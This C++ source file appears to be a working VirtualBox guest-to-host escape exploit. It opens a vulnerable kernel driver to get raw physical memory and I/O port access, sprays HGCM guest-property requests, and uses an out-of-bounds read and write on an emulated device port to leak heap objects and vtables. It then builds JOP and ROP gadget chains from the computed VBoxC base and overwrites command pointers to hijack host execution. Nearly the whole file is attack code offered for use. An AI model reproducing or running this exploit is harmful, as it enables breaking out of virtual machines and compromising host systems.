#define _CRT_RAND_S
#include <Windows.h>

#include <stdio.h>
#include <limits.h>
#include <stdlib.h>
#include "memory.h"
#include "common.h"
#include <stdint.h>
#include <iostream>
#include "vmm.h"
#include <vector>



#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)

#define PCI_ADDR(_bus_, _dev_, _func_, _addr_)  \
                                                \
    (unsigned int)(((_bus_) << 16) |            \
                   ((_dev_) << 11) |            \
                   ((_func_) << 8) |            \
                   ((_addr_) & 0xfc) | ((unsigned int)0x80000000))


typedef enum _data_width
{
	U8, U16, U32, U64

} data_width;

uint64_t request_buf_phys;
uint64_t hda_buf_phys, hda_buf_virt;
uint8_t request_buf[0x10000];
#define DEVICE_NAME L"RwDrv"
#define DRIVER_DEFAULT_NAME "RwDrv.sys"
HANDLE m_hDevice = NULL;

HANDLE m_hDevice_ioop = NULL;

#define assert(x) do{if(!(x)) {fprintf(stderr, "Assertion failed: %s at %s:%d", #x, __FILE__, __LINE__);exit(1);}}while(0)

using namespace std;
//uint32_t client;

int IOCTL_in_buffer_len = 0x00;
void* IOCTL_in_buffer = NULL;
int IOCTL_out_buffer_len = 0x00;
void* IOCTL_out_buffer = NULL;


typedef struct {
	volatile unsigned int port;
	volatile unsigned int operation;
	volatile unsigned int data_byte_out;
} Req;

BOOL DrvOpenDevice(PWSTR lpszDeviceName, HANDLE* phDevice)
{
	GET_NATIVE(NtOpenFile);

	IO_STATUS_BLOCK StatusBlock;
	OBJECT_ATTRIBUTES ObjAttr;
	UNICODE_STRING usName;

	UNICODE_FROM_WCHAR(&usName, lpszDeviceName);
	InitializeObjectAttributes(&ObjAttr, &usName, OBJ_CASE_INSENSITIVE, NULL, NULL);

#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020

	NTSTATUS ns = f_NtOpenFile(
		phDevice,
		FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE,
		&ObjAttr,
		&StatusBlock,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		FILE_SYNCHRONOUS_IO_NONALERT
	);
	if (!NT_SUCCESS(ns))
	{
		//DbgMsg(__FILE__, __LINE__, "NtOpenFile() fails; status: 0x%.8x\n", ns);
		return FALSE;
	}

	return TRUE;
}

enum operations {
	OPERATION_OUTBYTE = 0,
	OPERATION_INBYTE = 1,
	OPERATION_OUTSTR = 2,
	OPERATION_INSTR = 3,
};

bool uefi_expl_init(char* driver_path, bool use_dse_bypass)
{

	const LPCSTR FileName = "\\\\.\\ExploitDriver";

	HANDLE hFile = NULL;

	m_hDevice_ioop = CreateFileA(FileName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	// std::cout << "IO Driver handle: " << m_hDevice_ioop << endl;

	IOCTL_in_buffer = malloc(1024 * 16);
	IOCTL_out_buffer = malloc(1024 * 16);

	PWSTR lpszDeviceName = (PWSTR)TEXT("\\Device\\" DEVICE_NAME);

	// std::cout << "Using driver" << driver_path << endl;
	if (m_hDevice)
	{
		//DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Already initialized\n");
		return false;
	}

	// try to open device if service was already started
	if (DrvOpenDevice(lpszDeviceName, &m_hDevice))
	{
		// std::cout << "Already open: " << m_hDevice << endl;
		return true;
	}



	return true;
}

bool do_out_byte_operation(int port, UCHAR data)
{

	Req req;
	ZeroMemory(&req, sizeof(req));
	req.port = port;
	req.operation = OPERATION_OUTBYTE;
	req.data_byte_out = (int)data;


	DWORD bytes_returned = 0;

	memcpy(IOCTL_in_buffer, &req, sizeof(req));


	DeviceIoControl(m_hDevice_ioop,
		IOCTL(0x1337),
		(LPVOID)IOCTL_in_buffer,
		(DWORD)sizeof(req),
		IOCTL_out_buffer,
		1,
		&bytes_returned,
		NULL);
	return true;
}

UCHAR do_in_byte_operation(int port)
{
	Req req;
	ZeroMemory(&req, sizeof(req));
	req.port = port;
	req.operation = OPERATION_INBYTE;
	req.data_byte_out = (int)0x00;

	DWORD bytes_returned = 0;

	memcpy(IOCTL_in_buffer, &req, sizeof(req));
	ZeroMemory(IOCTL_out_buffer, 1024 * 16);

	DeviceIoControl(m_hDevice_ioop,
		IOCTL(0x1337),
		(LPVOID)IOCTL_in_buffer,
		(DWORD)sizeof(req),
		IOCTL_out_buffer,
		1,
		&bytes_returned,
		NULL);

	// std::cout << "Bytes returned: " << bytes_returned << endl;

	return *(UCHAR*)IOCTL_out_buffer;
}

void do_out_bytestr_operation(int port, void* data, int len)
{
	Req req;
	ZeroMemory(&req, sizeof(req));
	req.port = port;
	req.operation = OPERATION_OUTSTR;
	req.data_byte_out = (int)0x00;

	DWORD bytes_returned = 0;

	memcpy(IOCTL_in_buffer, &req, sizeof(req));
	memcpy((void*)((long long)IOCTL_in_buffer + sizeof(req)), data, len);

	DeviceIoControl(m_hDevice_ioop,
		IOCTL(0x1337),
		(LPVOID)IOCTL_in_buffer,
		(DWORD)sizeof(req),
		IOCTL_out_buffer,
		1,
		&bytes_returned,
		NULL);
}

void do_in_bytestr_operation(int port, void* out_data, int len)
{
	Req req;
	ZeroMemory(&req, sizeof(req));
	req.port = port;
	req.operation = OPERATION_INSTR;
	req.data_byte_out = (int)0x00;

	DWORD bytes_returned = 0;

	memcpy(IOCTL_in_buffer, &req, sizeof(req));

	DeviceIoControl(m_hDevice_ioop,
		IOCTL(0x1337),
		(LPVOID)IOCTL_in_buffer,
		(DWORD)sizeof(req),
		IOCTL_out_buffer,
		len,
		&bytes_returned,
		NULL);

	memcpy(out_data, IOCTL_out_buffer, len);
}

bool uefi_expl_mem_alloc(int size, unsigned long long* addr, unsigned long long* phys_addr)
{
	if (m_hDevice == NULL)
	{
		//DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Not initialized\n");
		return false;
	}

	UCHAR Request[0x100];
	ZeroMemory(&Request, sizeof(Request));

	*(PDWORD)(Request + 0x00) = size;

	DWORD dwBytes = 0;

	// send request to the driver
	if (DeviceIoControl(
		m_hDevice, 0x222880,
		&Request, sizeof(Request), &Request, sizeof(Request),
		&dwBytes, NULL))
	{
		*addr = *(PDWORD64)(Request + 0x08);
		*phys_addr = 0x00 | *(PDWORD)(Request + 0x04);

		return true;
	}
	else
	{
		//DbgMsg(__FILE__, __LINE__, "DeviceIoControl() ERROR %d\n", GetLastError());
	}

	return false;
}

void init() {
	uint64_t dummy;

	uefi_expl_mem_alloc(0x10000, &dummy, &request_buf_phys);
	printf("Request buf @ 0x%p\n", request_buf_phys);
}

bool uefi_expl_phys_mem_read(unsigned long long address, int size, unsigned char* buff)
{
	if (m_hDevice == NULL)
	{
		//DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Not initialized\n");
		return false;
	}

	UCHAR Request[0x100];
	ZeroMemory(&Request, sizeof(Request));

	*(PDWORD64)(Request + 0x00) = address;
	*(PDWORD64)(Request + 0x10) = (DWORD64)buff;
	*(PDWORD)(Request + 0x08) = size;
	*(PDWORD)(Request + 0x0c) = 2;

	bool bRet = false;
	DWORD dwBytes = 0;

	// write memory
	if (DeviceIoControl(
		m_hDevice, 0x222808,
		&Request, sizeof(Request), &Request, sizeof(Request),
		&dwBytes, NULL))
	{
		bRet = true;
	}
	else
	{
		//DbgMsg(__FILE__, __LINE__, "DeviceIoControl() ERROR %d\n", GetLastError());
	}
	return bRet;
}

bool uefi_expl_phys_mem_write(unsigned long long address, int size, unsigned char* buff, data_width alignment)
{
	if (m_hDevice == NULL)
	{
		//DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Not initialized\n");
		return false;
	}

	UCHAR Request[0x100];
	ZeroMemory(&Request, sizeof(Request));

	*(PDWORD64)(Request + 0x00) = address;
	*(PDWORD64)(Request + 0x10) = (DWORD64)buff;
	*(PDWORD)(Request + 0x08) = size;
	*(PDWORD)(Request + 0x0c) = (int)alignment;

	bool bRet = false;
	DWORD dwBytes = 0;

	// write memory
	if (DeviceIoControl(
		m_hDevice, 0x22280c,
		&Request, sizeof(Request), &Request, sizeof(Request),
		&dwBytes, NULL))
	{
		bRet = true;
	}
	else
	{
		//DbgMsg(__FILE__, __LINE__, "DeviceIoControl() ERROR %d\n", GetLastError());
	}
	return bRet;

}
//--------------------------------------------------------------------------------------
bool uefi_expl_port_write(unsigned short port, data_width size, unsigned long long val)
{
	if (m_hDevice == NULL)
	{
		//DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Not initialized\n");
		return false;
	}

	UCHAR Request[0x100];
	ZeroMemory(&Request, sizeof(Request));

	*(PWORD)(Request + 0x00) = port;
	*(PDWORD64)(Request + 0x04) = val;

	DWORD dwBytes = 0;
	BOOL bStatus = FALSE;

	switch (size)
	{
	case U8:

		// send request to the driver
		bStatus = DeviceIoControl(
			m_hDevice, 0x222814,
			&Request, sizeof(Request), &Request, sizeof(Request),
			&dwBytes, NULL
		);

		break;

	case U16:

		// send request to the driver
		bStatus = DeviceIoControl(
			m_hDevice, 0x22281c,
			&Request, sizeof(Request), &Request, sizeof(Request),
			&dwBytes, NULL
		);

		break;

	case U32:

		// send request to the driver
		bStatus = DeviceIoControl(
			m_hDevice, 0x222824,
			&Request, sizeof(Request), &Request, sizeof(Request),
			&dwBytes, NULL
		);

		break;

	default:

		//DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Invalid data width %d\n", size);
		return false;
	}

	if (bStatus)
	{
		return true;
	}
	else
	{
		//DbgMsg(__FILE__, __LINE__, "DeviceIoControl() ERROR %d\n", GetLastError());
	}

	return false;
}

uint32_t dispatch_offset = 0;
void set_dispatch_offset(uint32_t offset) {
	dispatch_offset = offset;
}
void* reqbuf() {
	return request_buf + dispatch_offset;
}



void write_req() {
	uefi_expl_phys_mem_write(request_buf_phys, 0x1000, request_buf, U32);
}

void read_req() {
	uefi_expl_phys_mem_read(request_buf_phys, 0x1000, request_buf);
}


void vmm_dispatch() {
	write_req();
	uefi_expl_port_write(0xd020, U32, request_buf_phys + dispatch_offset);
	read_req();
}

void guest_info() {
	VMMDevReportGuestInfo* req = (VMMDevReportGuestInfo*)reqbuf();
	req->header.size = sizeof(*req);
	req->header.version = VMMDEV_REQUEST_HEADER_VERSION;
	req->header.requestType = VMMDevReq_ReportGuestInfo;
	req->header.rc = 0;
	req->guestInfo.osType = VBOXOSTYPE_Win10_x64;
	req->guestInfo.interfaceVersion = VMMDEV_REQUEST_HEADER_VERSION;
	vmm_dispatch();
}
char spray_prefix[10];
bool spray_prefix_initialized = 0;

#define LEAK_MAGIC 0xdeadbeefdeadbeefull

uintptr_t alloc_base = 0x40000000;
void* alloc32(size_t size) {
	//printf("alloc base=%p\n", alloc_base);
	size = (size + 0xfff) & ~0xfff;
	void* res = VirtualAlloc(
		(void*)alloc_base, size,
		MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!res)
		exit(-1);
	assert((uintptr_t)res == alloc_base);
	assert((uint64_t)res == (uint32_t)res);
	alloc_base += 0x10000;
	return res;
}

static void* buf32[5];
void* get_temp_buf32(int idx, uint32_t size) {
	if (!buf32[idx]) {
		buf32[idx] = alloc32(0x10000);
	}
	if (size <= 0x10000) {
		return buf32[idx];
	}
	else {
		return alloc32(size);
	}
}

void hgcm_dispatch(int error_is_ok) {
	vmm_dispatch();
	VMMDevHGCMRequestHeader* req = (VMMDevHGCMRequestHeader*)reqbuf();
	int32_t rc = req->header.rc;
	if (rc == VINF_HGCM_ASYNC_EXECUTE) {
		// std::cout << "In async execute" << endl;
		while (!(req->fu32Flags & VBOX_HGCM_REQ_DONE)) {
			read_req();
		}
	}
	else {
		assert(error_is_ok);
	}
	if (req->result != 0) {
		cout << "Warning: Current result : " << req->result << endl;
	}
	//assert(req->result == 0);
}

uint32_t hgcm_connect(const char* svc) {
	VMMDevHGCMConnect* req = (VMMDevHGCMConnect*)reqbuf();
	req->header.header.size = sizeof(*req);
	req->header.header.version = VMMDEV_REQUEST_HEADER_VERSION;
	req->header.header.requestType = VMMDevReq_HGCMConnect;
	req->header.header.rc = 0;
	req->header.fu32Flags = 0;
	req->header.result = 0;
	req->loc.type = VMMDevHGCMLoc_LocalHost_Existing;
	strcpy((char*)req->loc.u.host.achName, svc);
	req->u32ClientID = 1337;
	hgcm_dispatch(0);
	return req->u32ClientID;
}



int hgcm_call(uint32_t client, uint32_t func, uint32_t cParms,
	HGCMFunctionParameter32* params, int waitforresult)
{
	VMMDevHGCMCall32* req = (VMMDevHGCMCall32*)reqbuf();
	req->header.header.size = sizeof(*req) + cParms * sizeof(params[0]);
	/*req->header.header.size = 0x408;*/
	req->header.header.version = VMMDEV_REQUEST_HEADER_VERSION;
	req->header.header.requestType = VMMDevReq_HGCMCall32;
	req->header.header.rc = 0;
	req->header.fu32Flags = 0;
	req->header.result = 0;
	req->u32ClientID = client;
	req->u32Function = func;
	req->cParms = cParms;
	assert(sizeof(VMMDevHGCMCall32) == 0x2c);
	assert(sizeof(HGCMFunctionParameter32) == 12);
	memcpy((void*)req->params, params, sizeof(params[0]) * cParms);
	if (waitforresult)
		hgcm_dispatch(0);
	else
	{
		vmm_dispatch();
		VMMDevHGCMRequestHeader* req = (VMMDevHGCMRequestHeader*)reqbuf();
		int32_t rc = req->header.rc;
		return rc;
	}
	return -1;
}


int wait_prop(uint32_t client, char* pattern, int pattern_size, char* out, int outsize) {
	assert((uint64_t)pattern < 1ll << 32);
	assert((uint64_t)out < 1ll << 32);

	HGCMFunctionParameter32 params[4];
	params[0].type = VMMDevHGCMParmType_LinAddr_In;
	params[0].u.Pointer.u.linearAddr = (RTGCPTR32)pattern;
	params[0].u.Pointer.size = pattern_size;
	params[1].type = VMMDevHGCMParmType_64bit;
	params[1].u.value64 = 0;
	params[2].type = VMMDevHGCMParmType_LinAddr_Out;
	params[2].u.Pointer.u.linearAddr = (RTGCPTR32)out;
	params[2].u.Pointer.size = outsize;
	params[3].type = VMMDevHGCMParmType_32bit;
	return hgcm_call(client, GET_NOTIFICATION, 4, params, 0);
}

void spray_cmds(uint32_t client, int from, int to, int size) {
	if (!spray_prefix_initialized) {
		spray_prefix_initialized = 1;
		unsigned int x;
		rand_s(&x);
		x %= 100000;
		sprintf(spray_prefix, "spray%u", x);
		printf("Spray prefix is %s\n", spray_prefix);
	}
	assert(size >= 0xa9);
	int patsize = size - 1 - 0xa8;
	assert(patsize > 20);
	char* pattern = (char*)get_temp_buf32(0, patsize);
	memset(pattern, 'a', patsize); // touch to page in

	char* out = (char*)get_temp_buf32(1, 1);
	out[0] = 'a'; // touch to page in

	for (int i = from; i < to; ++i) {
		sprintf(pattern, "%s-%d", spray_prefix, i);
		/*printf("Spraying pattern %s\n", pattern);*/
		wait_prop(client, pattern, patsize, out, 1);
	}
}

void hexdump(void* ptr, int buflen) {
	unsigned char* buf = (unsigned char*)ptr;
	int i, j;
	for (i = 0; i < buflen; i += 16) {
		printf("%06x: ", i);
		for (j = 0; j < 16; j++)
			if (i + j < buflen)
				printf("%02x ", buf[i + j]);
			else
				printf("   ");
		printf(" ");
		for (j = 0; j < 16; j++)
			if (i + j < buflen)
				printf("%c", isprint(buf[i + j]) ? buf[i + j] : '.');
		printf("\n");
	}
}

static const short port = 0x434;


void set_prop(uint32_t client,
	char* key, uint32_t key_sz, char* val, uint32_t val_sz) {
	HGCMFunctionParameter32 params[2];
	params[0].type = VMMDevHGCMParmType_LinAddr_In;
	params[0].u.Pointer.u.linearAddr = (RTGCPTR32)key;
	params[0].u.Pointer.size = key_sz;
	params[1].type = VMMDevHGCMParmType_LinAddr_In;
	params[1].u.Pointer.u.linearAddr = (RTGCPTR32)val;
	params[1].u.Pointer.size = val_sz;
	hgcm_call(client, SET_PROP, 2, params, 1);
}

int main()
{

	std::vector<int32_t> clients;

	std::cout << "Opening handle to driver..." << endl;
	uefi_expl_init((char*)"RwDrv.sys", false);
	std::cout << "Calling init" << endl;
	init();
	std::cout << "Calling guest_info" << endl;
	guest_info();


	std::cout << "Reset device" << endl;
	do_out_byte_operation(port + 3, 0);
	uint64_t* obj = 0x00;


	while (true) {
		for (int x = 0; x < 1024 / 16; x++) {
			int current_client = hgcm_connect("VBoxGuestPropSvc");
			if (current_client == 0) {
				std::cout << "Failed to register client" << endl;
				break;
			}
			//std::cout << "Got client: " << current_client << endl;

			for (int i = 0; i < 16; i++)
			{
				char* out = (char*)get_temp_buf32(1, 1);
				out[0] = 'a'; // touch to page in


				char tmp_pattern[0x70];
				sprintf(tmp_pattern, "SaU3RCld%08d_%08dAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", current_client, i);


				int rc = wait_prop(current_client, tmp_pattern, strlen(tmp_pattern) + 1, out, 1);

			}
			clients.push_back(current_client);
		}

		std::cout << "New round, new luck" << endl;
		// reset
		do_out_byte_operation(port + 3, 0);

		// initiate a write operation
		char buf[0x70]; //TODO: decide for a size that corresponds to the allocation size of the cmd struct we want to manipulate
		static const char cdb[1] = { 0 };
		do_out_byte_operation(port + 0, 0); // TargetDevice (0)
		do_out_byte_operation(port + 0, 1); // direction (to device)
		do_out_byte_operation(port + 0, ((sizeof(buf) >> 12) & 0xf0) | (sizeof(cdb) & 0xf)); // buffer length hi & cdb length
		do_out_byte_operation(port + 0, sizeof(buf) & 0xff); // buffer length low
		do_out_byte_operation(port + 0, (sizeof(buf) >> 8) & 0xff); // buffer length mid
		for (int i = 0; i < sizeof(cdb); i++)
			do_out_byte_operation(port + 0, cdb[i]);

		// read buffer + 8 bytes (discarded)
		do_in_bytestr_operation(port + 1, buf, sizeof(buf) - 1);
		
		do_in_bytestr_operation(port + 1, buf, 9);

		uint64_t leak_addr = 0;
		uint64_t chain_addr = 0;
		std::vector<uint64_t> leaked;
		leaked.reserve(4096);
		std::vector<uint64_t*> objs;
		for (size_t off = 0; off < 4096; off += 8) { //TODO: decide how many bytes after our buff we want to read
			// read 8 byte
			leaked.push_back(0);
			do_in_bytestr_operation(port + 1, &leaked.back(), 8);

			if (leak_addr && leaked.back() == 0x646C435233556153) {
				chain_addr = leak_addr + leaked.size() * 8;

				uint64_t vboxc_base = objs[0][0] - 0x2665a8; //vtable offset

				uint64_t gadget_1 = vboxc_base + 0x15054; // mov rax, [r8]; mov rcx, r8; call [rax + 8]
				uint64_t gadget_2 = vboxc_base + 0xa503c; // mov r11, [rcx]; movzx r10d, bl; movzx r9d, r12b; movzx r8d, bpl; mov edx, edi; mov [rsp + 0x20], r10d; call [r11 + 0x10]
				uint64_t gadget_3 = vboxc_base + 0x18e93; // mov rsp, r11; pop r14; pop r13; pop r12; pop rdi; pop rbp; ret

				gadget_1 = 0x41414141;

				int leaked_size_start = leaked.size();
				//add jopchain to leaked
				leaked.push_back(chain_addr + 0x10);
				leaked.push_back(0x636c6163);
				leaked.push_back(gadget_1);
				leaked.push_back(gadget_2);
				leaked.push_back(gadget_3);
				leaked.push_back(0xdeadbeefc0febabe); 
				leaked.push_back(0x0000000010000000); // place into VRAM section

				uint64_t stage2_gadget_0 = vboxc_base + 0x10db8e;
				uint64_t stage2_gadget_1 = vboxc_base + 0x15b510;
				uint64_t stage2_gadget_2 = vboxc_base + 0x10a94a;
				uint64_t stage2_gadget_3 = vboxc_base + 0x2a5ac;
				uint64_t stage2_gadget_4 = vboxc_base + 0x18042d;
				uint64_t stage2_gadget_5 = vboxc_base + 0x85a91;


				//add ropchain to leaked
				leaked.push_back(stage2_gadget_0); //rip
				leaked.push_back(vboxc_base + 0x22F0A0 - 0x10);
				leaked.push_back(stage2_gadget_1);
				leaked.push_back(stage2_gadget_2);
				leaked.push_back(0x4e420);
				leaked.push_back(stage2_gadget_3);
				leaked.push_back(stage2_gadget_4);
				leaked.push_back(0x10 + leak_addr + 8 * leaked.size() - 8 * 15);
				leaked.push_back(stage2_gadget_5);

				const char* end = (const char*)(1 + &leaked.back());
				const char* beg = end - 8 * (leaked.size() - leaked_size_start);
				for (const char* r = beg; r != end; r++)
					do_out_byte_operation(port + 1, *r);
				continue;
			}

			//check if we found an object
			if (leaked.size() < 4)
				continue;
			//if all our checks are matching, this would point at the vtable
			obj = &leaked[leaked.size() - 4];
			// check vtable page offset
			//if ((obj[0] & 0xfff) != 0x5a8)
			//	continue;
			if ((obj[0] & 7) != 0)
				continue;

			if (obj[0] < 0x100000)
				continue;
			//// std::cout << "Found potential vtable @ 0x" << std::hex << off - 0x18 << std::dec << endl;
			if ((obj[0] >> 48) != 0)
				continue;
			// check crefs from HGCMReferencedObject
			if ((obj[1] & 0xffffffff) != 1)
				continue;
			//// std::cout << "Refs match as well" << endl;
			// check obj type from HGCMReferencedObject
			if ((obj[1] >> 32) != 2)
				continue;
			//// std::cout << "Type looks good" << endl;
			// check version from HGCMMsgCore
			if ((obj[2] & 0xffffffff) != 1)
				continue;
			//// std::cout << "Version good" << endl;
			// check msgid from HGCMMsgCore
			if ((obj[2] >> 32) < 4)
				continue;
			if ((obj[2] >> 32) > 40)
				continue;
			//// std::cout << "Msg id" << endl;
			// check threadptr from HGCMMsgCore
			if (obj[3] == 0)
				continue;

			// we probably found the vtable
			std::cout << "Probably found MsgCall instance. VTABLE:" << endl;
			hexdump(obj, 0x20);

			// this is a valid object, store it
			objs.push_back(obj);

			// if we have at least two objects, we can check if they link each other
			if (objs.size() < 2)
				continue;

			if (!leak_addr) {
				for (size_t a = 0; a < objs.size(); a++) {
					for (size_t b = 0; b < objs.size(); b++) {
						if (a == b)
							continue;
						//check if the two objects point at each other
						int64_t distance = (objs[b] - objs[a]) * 8;
						int64_t a_fd = objs[a][5];
						int64_t b_bk = objs[b][6];
						if (a_fd - b_bk != distance)
							continue;
						leak_addr = b_bk - 8 * (objs[a] - &leaked.front());
						goto ADDR_FOUND;
					}
				}
			ADDR_FOUND:
				continue;
			}

			if (chain_addr)
				goto FOUND;
		}
		//hexdump(&leaked.front(), 4096);
		continue;

	FOUND:
		std::cout << "found objects after reading " << 8 * leaked.size() << " bytes" << endl;
		std::cout << "Client first: " << clients.front() << " Last: " << clients.back() << endl;
		std::cout << "Addr of leak: 0x" << std::hex << leak_addr << std::dec << endl;
		hexdump(&leaked.front(), leaked.size() * 8);


		//we found a Msg
		// Advance 4 *8 bytes to place the pointer at pCMD
		for (int i = 0; i < 4; i++) {
			// read 8 byte
			leaked.push_back(0);
			do_in_bytestr_operation(port + 1, &leaked.back(), 8);
		}

		// overwrite pcmds
		leaked.push_back(chain_addr + 8);
		for (int i = 0; i < 8; i++)
		{
			do_out_byte_operation(port + 1, (UCHAR)(leaked.back() >> (i * 8)));
		}

		// Overwrite port address
		leaked.push_back(chain_addr);
		for (int i = 0; i < 8; i++)
		{
			do_out_byte_operation(port + 1, (UCHAR)(leaked.back() >> (i * 8)));
		}

		for (int i = 0; i < 4; i++) {
			// read 8 byte
			leaked.push_back(0);
			do_in_bytestr_operation(port + 1, &leaked.back(), 8);
		}

		for (int i = 0; i < objs.size(); i++) {
			std::cout << "obj[" << i << "] @ 0x" << std::hex << (leak_addr + ((objs[i] - &leaked[0]) * 8)) << std::dec << ":" << endl;
			for (int j = 0; j < 0x70 / 8; j++)
				std::cout << "0x" << std::hex << objs[i][j] << endl;
		}

		int current_client = objs.back()[10] & 0xffffffff;
		// std::cout << "We found current client from message: " << current_client << endl;

		cout << " ~~~~~~~ PRAY NOW! ~~~~~~~" << endl;
		// Free notifications
		for (int i = 0; i < 16; i++)
		{
			char* out = (char*)get_temp_buf32(1, 1);
			out[0] = 'a'; // touch to page in

			char tmp_pattern[20];
			sprintf(tmp_pattern, "spray%d_%d", current_client, i);

			int rc = wait_prop(current_client, tmp_pattern, strlen(tmp_pattern) + 1, out, 1);

		}
		break;
	}
}
